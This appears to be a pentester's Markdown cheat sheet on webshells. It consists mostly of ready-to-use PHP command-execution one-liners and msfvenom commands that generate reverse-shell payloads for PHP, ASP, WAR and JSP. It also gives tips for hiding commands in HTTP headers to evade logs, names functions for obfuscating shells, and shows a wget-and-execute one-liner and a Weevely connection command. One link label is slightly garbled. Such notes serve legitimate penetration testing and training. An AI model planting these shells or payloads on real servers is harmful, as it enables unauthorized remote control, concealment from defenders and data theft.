# Webshells

## Built in List with Kali Linux

```bash
ls -la /usr/share/webshells
```

## Simple HTTP Server with Upload

```
# wget one liner
wget https://gist.githubusercontent.com/UniIsland/3346170/raw/059aca1d510c615df3d9fedafabac4d538ebe352/SimpleHTTPServerWithUpload.py ; chmod +x SimpleHTTPServerWithUpload.py; ./SimpleHTTPServerWithUpload.py

# git link
https://gist.github.com/UniIsland/3346170
```

## Reverse-Shells

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-sthe hell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

## Webshells - Platform Independent

* a webshell is a shell that you can access through the web
* useful for when you have firewalls that filter outgoing traffic on ports other than port 80
* more stealthy since the traffic is hidden in the http traffic.

## PHP

### This PHP-shell is OS-Independent. Inject into Pages that Use PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
```

### Execute One Command

```bash
<?php system("whoami"); ?>
```

### Take Input from the URL Parameter... shell.php?cmd=whoami

```bash
<?php system($_GET['cmd']); ?>
```

### The Same as Above but Using Passthru

```bash
<?php passthru($_GET['cmd']); ?>
```

### For shell\_exec to Output the Result, Echo it

```bash
<?php echo shell_exec("whoami");?>
```

### Return the Output as an Array, and then Print it All

```bash
<?php exec("ls -la",$array); print_r($array); ?>
```

### This is a Cool Trick

```bash
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```

### Using Backticks

```bash
<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>
```

```bash
<?php `echo whoami`; ?>
```

### Execute the Commands Like This

```bash
[http://192.168.1.103/index.php?cmd=pwd](http://192.168.1.103/index.php?cmd=pwd)
```

## ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp
```

## WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
```

## JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
```

## Access to Different Webshells on Kali

```bash
/usr/share/webshells
```

## Make it Stealthy

* we can make the commands from above a bit more stealthy
* instead of passing the cmds through the url, which will be obvious in logs, we pass them through other header-paramters
* tampterdata, burpsuit, netcat or curl to insert the commands

```bash
<?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
```

```bash
<?php system($_SERVER['HTTP_USER_AGENT'])?>
```

```bash
<?php echo passthru($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
```

## Obfuscation

### The Following Functions Can be Used to Obfuscate the Code

```bash
eval()
assert()
base64()
gzdeflate()
str_rot13()
```

## Weevely - Incredible tool!

* weevely can create php webshells easily
* weevely generates password /root/webshell.php

### Now Execute it and Get a Shell in Return

```bash
weevely "[http://192.168.1.101/webshell.php](http://192.168.1.101/webshell.php)" password
```

## References

* [http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/](http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/)
* [http://www.binarytides.com/web-shells-tutorial/](http://www.binarytides.com/web-shells-tutorial/^stage)
